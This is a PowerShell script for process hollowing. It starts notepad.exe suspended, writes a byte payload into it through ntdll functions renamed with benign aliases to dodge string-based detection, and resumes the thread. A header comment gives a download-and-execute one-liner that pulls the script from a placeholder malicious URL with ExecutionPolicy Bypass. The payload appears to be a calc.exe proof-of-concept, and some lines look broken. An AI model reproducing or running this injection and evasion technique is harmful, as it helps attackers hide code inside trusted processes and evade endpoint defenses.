// The PowerShell Aliased Loader: NTAPI with EntryPoint Evasion
// powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$src = Invoke-RestMethod '#{server.malicious.url}/Invoke-AliasedHollowing.ps1'; Invoke-Expression $src; Invoke-AliasedHollowing -Target 'C:\Windows\System32\notepad.exe'"

function Invoke-AliasedHollowing {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Target
    )

    Write-Host "[*] Executing Aliased NTAPI Hollowing..." -ForegroundColor Cyan

    $Definitions = @"
    using System;
    using System.Runtime.InteropServices;

    public class Alias {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO { public uint cb; public IntPtr lpRes, lpDesk, lpTitle; public uint dwX, dwY, dwXS, dwYS, dwXC, dwYC, dwFill, dwFlags; public ushort wShow, cbRes2; public IntPtr lpRes2, hIn, hOut, hErr; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }

        // --- 🟢 ALIASING SECTION 🟢 ---
        // We name the functions something else to bypass string-based detection.
        [DllImport("ntdll.dll", EntryPoint = "NtAllocateVirtualMemory")]
        public static extern uint BenignAlloc(IntPtr hProc, ref IntPtr baseAddr, IntPtr zeroBits, ref UIntPtr regionSize, uint allocType, uint protect);

        [DllImport("ntdll.dll", EntryPoint = "NtWriteVirtualMemory")]
        public static extern uint BenignWrite(IntPtr hProc, IntPtr baseAddr, byte[] buffer, uint size, out IntPtr written);

        [DllImport("ntdll.dll", EntryPoint = "NtResumeThread")]
        public static extern uint BenignResume(IntPtr hThread, out uint count);

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpAppName, string lpCmdLine, IntPtr lpProcAttr, IntPtr lpThreadAttr, bool bInherit, uint dwFlags, IntPtr lpEnv, string lpDir, [In] ref STARTUPINFO lpSI, out PROCESS_INFORMATION lpPI);
    }
"@

    Add-Type -TypeDefinition $Definitions

    [byte[]]$Payload = 0xf0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x83,0xec,0x28,0x48,0x83,0xe4,0xf0,0x48,0x8d,0x15,0x07,0x00,0x00,0x00,0x48,0x8d,0x0d,0x05,0x00,0x00,0x00,0xff,0x25,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x05,0x01,0x00,0x00,0x00,0xc3,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00

    $SI = New-Object Alias+STARTUPINFO
    $SI.cb = [Marshal]::SizeOf($SI)
    $PI = New-Object Alias+PROCESS_INFORMATION

    if ([Alias]::CreateProcess($Target, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$SI, out $PI)) {
        
        $Base = [IntPtr]0x400000
        $Size = [UIntPtr][uint32]$Payload.Length
        
        # Calling via the Aliased names
        [Alias]::BenignAlloc($PI.hProcess, [ref]$Base, [IntPtr]::Zero, [ref]$Size, 0x3000, 0x40) | Out-Null
        [Alias]::BenignWrite($PI.hProcess, $Base, $Payload, [uint32]$Payload.Length, [out][IntPtr]::Zero) | Out-Null
        
        $count = 0
        [Alias]::BenignResume($PI.hThread, [out]$count) | Out-Null
        
        Write-Host "[+] Hollowing complete using Aliased NTAPI functions." -ForegroundColor Green
    }
}
